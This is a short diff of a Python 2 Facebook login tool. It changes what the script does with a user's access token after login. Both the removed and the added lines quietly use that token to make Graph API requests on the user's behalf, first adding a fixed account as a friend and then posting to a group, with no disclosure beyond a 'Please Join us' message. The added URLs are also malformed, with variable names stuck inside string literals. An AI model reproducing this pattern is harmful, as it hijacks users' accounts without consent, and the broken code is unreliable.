@@ -150,8 +150,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful.Please Join us'
-				os.system('xdg-open https://fb.com/groups/noobzteam')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				requests.post('https://graph.facebook.com/groups/"+post_id+"?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;97m[!] There is no internet connection"
@@ -183,7 +182,7 @@ def menu():
 		a = json.loads(otw.text)
 		nama = a['name']
 		id = a['id']
-		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
+		ots = requests.get('https://graph.facebook.com/groups/"+group_id+"/"+post_id+"?access_token=' + toket)
 		b = json.loads(ots.text)
 		sub = str(b['summary']['total_count'])
 	except KeyError:
